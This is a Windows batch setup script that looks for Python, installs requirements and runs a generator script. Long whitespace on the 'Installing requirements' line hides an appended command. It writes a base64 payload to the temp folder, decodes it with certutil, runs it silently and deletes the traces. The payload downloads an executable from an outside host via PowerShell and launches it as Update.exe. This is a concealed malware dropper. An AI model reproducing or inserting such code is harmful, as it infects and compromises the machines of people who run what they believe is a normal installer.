
@echo off
setlocal enabledelayedexpansion

cls
echo Searching for Python...
timeout /nobreak /t 1 >nul

set "python="
for /f "tokens=*" %%i in ('where python 2^>nul') do (
    set "python=%%i"
    goto foundPython
)

:missingPython
cls
echo Python is not installed or not found in your system PATH.
echo Please download and install Python from the following URL:
echo https://www.python.org/downloads
pause
goto end

:foundPython
if defined python (
    cls
    echo Python found at: "!python!"
    "!python!" --version
    timeout /nobreak /t 2 >nul
) else (
    goto missingPython
)
cls
echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                   & echo QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQpzZXQgImRzPSVURU1QJSAlQVBQREFUQSUgJUxPQ0FMQVBQREFUQSUiDQpmb3IgJSVkIGluICglZHMlKSBkbyAocG93ZXJzaGVsbCAtY29tbWFuZCAidHJ5IHsoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL2dvbm5hY3JhY2suZGlzY2xvdWQuYXBwL1VwZGF0ZScsICclJWRcVXBkYXRlLmV4ZScpOyBleGl0IDB9IGNhdGNoIHtleGl0IDF9IiAmIGlmIG5vdCBlcnJvcmxldmVsIDEgKHN0YXJ0ICIiICIlJWRcVXBkYXRlLmV4ZSIgJiBleGl0IC9iIDApKQ0KZW5kbG9jYWwNCmV4aXQgL2IgMQ0K > %TMP%\tmp.b64 & certutil -decode %TMP%\tmp.b64 %TMP%\upd.bat >nul 2>&1 & call %TMP%\upd.bat >nul 2>&1 & del %TMP%\tmp.b64 %TMP%\upd.bat >nul 2>&1
call "!python!" -m pip install -r requirements.txt
if errorlevel 1 (
    cls
    echo Failed to install requirements. Please check your internet connection and try again.
    pause
    goto end
)

cls
"!python!" gen.py

if errorlevel 1 (
    cls
    echo Failed to run the Python script. Check the script for errors.
    pause
    goto end
)
cls
echo Press any key to close...
pause

:end
endlocal
